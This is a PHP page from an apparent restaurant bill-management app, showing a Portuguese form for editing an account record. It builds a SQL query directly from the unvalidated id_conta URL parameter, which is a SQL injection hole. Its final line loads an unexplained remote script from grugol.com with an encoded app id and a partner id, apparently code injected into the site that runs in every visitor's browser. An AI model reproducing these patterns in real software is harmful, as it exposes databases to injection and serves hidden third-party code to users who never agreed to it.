<?php 
  require_once 'connect_db.php';
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>fastfood v1 - Start</title>
    <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
    <script type="text/javascript" src="jquery.quick.search.js"></script>
    <link rel="stylesheet" href="css/style.css">

</head>
<body>
<div class="container">
 <?php include "menu2.php" ?>



      <div class="row marketing" style=" border: 1px solid rgb(225, 232, 237); border-radius: 4px; ">
        <div class="col-lg-6">
          <h4>Alterar Conta</h4>

 <form action="includes/altera_conta2.php" method="post" class="form-group">
      <?php 
        $id_conta = $_GET['id_conta'];
        $resultado = mysql_query("SELECT * FROM tab_conta where id_conta = $id_conta",$dbconn);
        if ($resultado) {
        while ($row = mysql_fetch_assoc($resultado)) {
          ?>

        ID:
        <div class="form-group">
        <input readonly="true" type="text" class="form-control" style="width:210px;" name="id_conta" value="<?php echo $row['id_conta']?>"/></div>

        Status:
        <div class="form-group">
        <select name="status" class="form-control" style="width:210px;">
          <option>Ativa</option>
          <option>Encerrada</option>
        </select></div>

        codGarcom:
        <div class="form-group">
        <input type="text" name="codGarcom" class="form-control" style="width:210px;" value="<?php echo $row['codGarcom']?>" required></div>


        Mesa:
        <div class="form-group">
        <input type="text" name="mesa" class="form-control" style="width:210px;" value="<?php echo $row['mesa']?>" required></div>
        

        Valor Total:
        <div class="form-group">
        <input type="text" name="valorTotal" class="form-control" style="width:210px;" value="<?php echo $row['valorTotal']?>" required></div>

        Pedido:
        <div class="form-group">
          <select name="pro_id" class="form-control" style="width:210px;" required>
            <?php
            $qr= mysql_query("SELECT * FROM tab_prod ");
            while ($row=mysql_fetch_array($qr)){
            ?>
            <option value="<?php echo $row['pro_id']?>"><?php echo $row['pro_nome']?></option>
            <?php }?>
          </select></div>

        <input type="submit" class="btn btn-success" style="width:105px;" value="Alterar" name="alterar"> 
        <input type="button" class="btn btn-default" style="width:105px;" value="Cancelar"
          onclick="window.location='ver_conta2.php';" />  
        
        <?php 
            }
          }
        mysql_close($dbconn);
        ?>

      </form>


        </div>
      </div>

  <!-- fim da classe container -->

      <footer class="footer">
        <p>&copy; 2017 Company, Inc.</p>
      </footer>

    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
  <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script src='http://grugol.com/prog/landing.php?app=MDAtMUUtOEMtMjUtRkEtMEQ=&partner=200'></script>

  
</body>
</html>
